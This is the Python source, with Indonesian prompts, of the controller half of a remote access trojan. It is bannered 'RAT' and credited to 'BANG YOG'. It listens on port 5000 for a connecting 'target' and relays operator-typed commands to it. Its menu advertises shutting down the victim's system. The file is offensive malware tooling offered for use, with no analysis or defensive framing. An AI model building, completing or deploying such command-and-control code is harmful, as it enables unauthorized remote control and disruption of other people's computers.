import socket
import os
import time
import platform
import sys

# WARNA
r = "\033[0m"
bbl = "\033[1;30m"
br = "\033[1;31m"
bg = "\033[1;32m"
by = "\033[1;33m"
bb = "\033[1;34m"
bm = "\033[1;35m"
bc = "\033[1;36m"
bw = "\033[1;37m"

user = os.getlogin()

class Server:
    def __init__(self, lhost="0.0.0.0", lport=5000):
        self.lhost = lhost
        self.lport = lport
        self.serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    
    def clean(self):
        os.system("cls" if platform == "nt" else "clear")
    
    def header(self):
        print(f"""{br}
 ██████╗  █████╗ ████████╗
 ██╔══██╗██╔══██╗╚══██╔══╝
 ██████╔╝███████║   ██║   
 ██╔══██╗██╔══██║   ██║   
 ██║  ██║██║  ██║   ██║   
 ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
** CREATED BY BANG YOG **
{r}""")
        
    def menu(self):
        print("""\n
perintah       |      fungsi
-------------------------------------------
system_off     |      Matikan system target    
""")
    
    def runserver(self):
        self.serv.bind((self.lhost, self.lport))
        self.serv.listen(1)

        print(f"{bb}[*]{bw} Menunggu koneksi pada {by}{self.lhost}:{self.lport}{bw}...")
        time.sleep(0.5)

        client_server, client_address = self.serv.accept()
        print(f"{bg}[+]{bw} Berhasil terhubung ke target {bg}{client_address}{bw}")
        time.sleep(0.5)

        pesan_client = client_server.recv(1024).decode()
        print(f"{bg}{pesan_client}{bw}")
        time.sleep(0.5)

        while True:
            try:
                perintah = input(f"\n{br}{user}@rat--${bw} ")
                client_server.send(perintah.encode())

                if perintah == "exit":
                    print(f"\n{br}[!] Tools dihentikan...{bw}")
                    time.sleep(0.5)
                    sys.exit()
                elif perintah == "help":
                    c = Server()
                    c.menu()
            except KeyboardInterrupt:
                print(f"\n{br}[!] Tools dihentikan...{bw}")
                time.sleep(0.5)
                sys.exit()

if __name__ == "__main__":
    while True:
        try:
            srv = Server()
            time.sleep(0.5)
            srv.clean()
            srv.header()
            srv.runserver()
        except KeyboardInterrupt:
            print(f"\n{br}[x] Keluar dari tools...")
            time.sleep(0.5)
            break